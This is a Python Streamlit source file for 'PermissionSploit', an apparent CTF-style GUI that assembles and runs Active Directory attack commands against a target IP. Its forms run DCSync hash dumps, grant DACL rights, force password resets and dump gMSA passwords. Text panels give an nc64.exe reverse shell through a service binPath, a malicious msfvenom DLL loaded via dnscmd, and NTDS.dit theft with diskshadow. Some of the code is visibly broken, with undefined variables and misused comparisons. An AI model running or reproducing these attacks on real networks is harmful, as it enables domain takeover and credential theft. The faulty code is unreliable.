import streamlit as st
import subprocess
from utils import *
import os

st.set_page_config(page_title="PermissionSploit")

css='''
<style>
    section.main > div {max-width:70rem}
</style>
'''
st.markdown(css, unsafe_allow_html=True)
st.sidebar.markdown("**Current Target IP** :  "+st.session_state.ip)
st.sidebar.markdown("**Current Target Domian** :  "+st.session_state.domain)
if st.session_state.ip is not '':
    time_diff = get_date_diff(st.session_state.ip)
    pref_exec = "faketime -f " + time_diff +"h"
    if st.sidebar.button("GetTimeDifference"):
        if time_diff:
            st.sidebar.success("server time - local time = {}h".format(time_diff))
        else:
            st.warning("something wrong ..")

st.sidebar.markdown("**Credentials**")
init1_col1,init1_col2 = st.sidebar.columns(2)
with init1_col1:
    username  = st.text_input("username",st.session_state.username)
with init1_col2:
    password = st.text_input("password ",st.session_state.password)
user_hash = st.sidebar.text_input('user_hash (format: LM\:NLTM)',st.session_state.user_hash)
ticket_file_path = st.sidebar.text_input("kerberos tickets path",st.session_state.ticket_file_path)
save_credentials = st.sidebar.button("save")
if save_credentials:
    st.session_state.username = username
    st.session_state.password = password
    st.session_state.user_hash = user_hash
    st.session_state.ticket_file_path = ticket_file_path
    st.sidebar.success("save successfully")


st.sidebar.markdown("# PermissionSploit")
st.sidebar.markdown("From the result of blodhound or information from user shell, find priviledge escalation to administor")
st.sidebar.markdown('''
    - DCsync
    - Genericall Permission 
    - WriteDACL Permission
    - Forcechangepassword Permission
    - GenericWrite Permission
    - ReadGMSAPassword Permission
    - Specific Group Exploit
    ''')
st.session_state.show_command = st.sidebar.checkbox("Show command", True)


st.title("DCsync")
with st.form('DCsync'):
    col1, col2 = st.columns([2.5,1]) 
    with col1:
        option = st.selectbox(
           "choose credential",
           ("password", "user_hash", "kerberos"),
           index=None,
           placeholder="choose credential",
           label_visibility='collapsed'
        )
    with col2:
        button = st.form_submit_button("DCsync Attack")
    if button:
        if st.session_state.ip and st.session_state.domain and option :
            if option:
                if option is "password":
                    command = "{} secretsdump.py '{}/{}:{}@{}'".format(pref_exec,st.session_state.domain,username,password,st.session_state.ip)
                elif option is "user_hash":
                    command = "{} secretsdump.py '{}/{}@{}' -hashes {}".format(pref_exec,st.session_state.domain,username,st.session_state.ip,user_hash)
                else:
                    command = "export KRB5CCNAME={};".format(ticket_file_path)
                    command += "{} secretsdump.py -no-pass -k {}".format(folder_name,domain)
                run_command(command )
                show_command(command)


st.title("Genericall")
st.subheader(":gray[Add new user to Genericall group] ")
st.info('''
    net user test123  test123! /add /domain :n
    net group    #该命令的结果中找到了Exchange Windows Permissions组 :n
    net group 'Exchange Windows Permissions' test123  /add /domain :n
    net localgroup #在该命令的结果中发现了Remote Management Users组 :n
    net localgroup 'Remote Management Users' test123  /add
    ''')
st.subheader(":gray[Reset user of Genericall group's password] ")
st.info("kerberos ticket is required")
with st.form('Genericall'):
    col1, col2 = st.columns([1.5,1]) 
    with col1:
        target_group = st.text_input("target_group",placeholder="target_group",label_visibility='collapsed')
    with col2:
        button1 = st.form_submit_button("GiveResetPasswordPermission")
    if button1:
        if st.session_state.ip and st.session_state.domain and ticket_file_path and  target_group:
                flat_group = GROUP_format(target_group)
                command = "export KRB5CCNAME={};".format(ticket_file_path)
                command += "{} dacledit.py {}/{} -dc-ip {} -k -no-pass -use-ldaps -principal \"{}\" -action write -rights ResetPassword -target-dn \"{}\" -debug -inheritance".format(pref_exec,st.session_state.domain,username,st.session_state.ip,username,flat_group)
                run_command(command )
                show_command(command)
    col11, col12,col13 = st.columns([1.5,1.5,1])
    with col11:
        target_user = st.text_input("target_user",placeholder="target_user",label_visibility='collapsed')
    with col12:
        new_password = st.text_input("new_password",placeholder="new_password",label_visibility='collapsed')
    with col13:
        button2 =  st.form_submit_button("Change Password")
    if button2:
        if st.session_state.ip and username and password and target_user and new_password:
            command = "{} rpcclient -U {} --password='{}' -c \"setuserinfo2 {} 23 '{}'\" //{}".format(pref_exec,username,password,target_user,new_password,st.session_state.ip)
            run_command(command)
            show_command(command)
        else:
            warning("missing","ip")
st.title("WriteDACL ")

with st.form('WriteDACL Exploit'):
    col1, col2 = st.columns([2.5,1])
    with col1:
        option = st.selectbox(
           "choose credential",
           ("user_hash", "kerberos"),
           index=None,
           placeholder="choose credential",
           label_visibility='collapsed'
        )
    with col2:
        button =  st.form_submit_button("WriteDACL Exploit")
    if button:
        if st.session_state.ip and username and st.session_state.domain and option:
            query_string = "Add-DomainObjectAcl -PrincipalIdentity '{}' -TargetIdentity '{}' -Rights DCSync".format(username,DC_format(st.session_state.domain))
            if option is "user_hash":
                command = "{} powerview.py {}/{}@{} -H {} --no-pass --dc-ip {} --use-ldaps -q \"{}\"".format(pref_exec,st.session_state.domain,username,st.session_state.ip,user_hash,st.session_state.ip,query_string)
            else:
                command = "export KRB5CCNAME={};".format(ticket_file_path)
                command += "{} powerview.py {}/{}@{} -k --no-pass --dc-ip {} --use-ldaps -q \"{}\"".format(pref_exec,st.session_state.domain,username,st.session_state.ip,st.session_state.ip,query_string)
            run_command(command)
            show_command(command)
        else:
            st.warning("Please enter a command.")

st.title("Forcechangepassword")

with st.form('Forcechangepassword Exploit'):
    col1, col2,col3 = st.columns([1.5,1.5,1])
    with col1:
        target_user = st.text_input("target_user",placeholder="target_user",label_visibility='collapsed')
    with col2:
        new_password = st.text_input("new_password",placeholder="new_password",label_visibility='collapsed')
    with col3:
        button =  st.form_submit_button("Change Password")
    if button:
        if st.session_state.ip and username and password and target_user and new_password:
            command += "{} rpcclient -U {} --password='{}' -c \"setuserinfo2 {} 23 '{}'\" //{}".format(pref_exec,username,password,target_user,new_password,st.session_state.ip)
            run_command(command)
            show_command(command)
        else:
            warning("missing","ip")

st.title("GenericWrite")

st.info('''
    PS : Get-ADUser [target_user] | Set-ADAccountControl -doesnotrequirepreauth $true :n
    Kali : GetNPUsers.py [domain]/[target_user] -dc-ip [ip]
    ''')

st.title("ReadGMSAPassword")

with st.form('ReadGMSAPassword'):
    col1, col2 = st.columns([2.5,1]) 
    st.info("username and password is required")
    button = st.form_submit_button("Dump gMSA")
    if button:
        if username and st.session_state.ip and password :
                command = "{} crackmapexec ldap {} -u {} -p {} -k --gmsa".format(pref_exec,st.session_state.ip,username,password)
                run_command(command )
                show_command(command)

st.title("whoami /groups")
st.subheader(":gray[Server Operators] ")
st.info('''
    upload nc64.exe:n
    sc.exe config browser binPath= "C:\\programdata\\nc64.exe -e cmd.exe [reverse_ip] [reverse_port]":n
    sc.exe stop browser:n
    sc.exe start browser
    ''')
st.subheader(":gray[DNS Admin] ")
st.info('''
    msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll :n
    upload da.dll :n
    *Evil-WinRM* PS C:\\Users\\ryan\\Documents>cmd /c dnscmd 10.10.10.169 /config /serverlevelplugindll da.dll :n
    *Evil-WinRM* PS C:\\Users\\ryan\\Documents>sc.exe stop dns :n
    *Evil-WinRM* PS C:\\Users\\ryan\\Documents>sc.exe start dns
    ''')
st.subheader(":gray[Backup Operator] ")
st.info('''
    Evil-WinRM PS : cd c:\\temp :n
    Evil-WinRM PS : echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii :n
    Evil-WinRM PS : echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append :n
    Evil-WinRM PS : echo "create" | out-file ./diskshadow.txt -encoding ascii -append :n
    Evil-WinRM PS : echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append :n
    Evil-WinRM PS : diskshadow.exe /s c:\\temp\\diskshadow.txt :n
    Evil-WinRM PS : cd Z:\\windows\\ntds :n
    Evil-WinRM PS : robocopy /b .\\ C:\temp NTDS.dit :n
    Evil-WinRM PS : reg.exe save hklm\\system C:\\temp\\system.bak :n
    Evil-WinRM PS : download ntds.dit :n
    Evil-WinRM PS : download system.bak
    Kali : secretsdump.py -ntds ntds.dit -system system.bak LOCAL
    ''')
# st.title("whoami /priv")
# st.subheader(":gray[SeBackupPrivilege enable  & SeRestorePrivilege enable] ")
# st.info('''
#     robocopy C:\\users\\administrator\\root.txt .\\root.txt
#     ''')
# st.subheader(":gray[SEBackupPrivilege enable] ")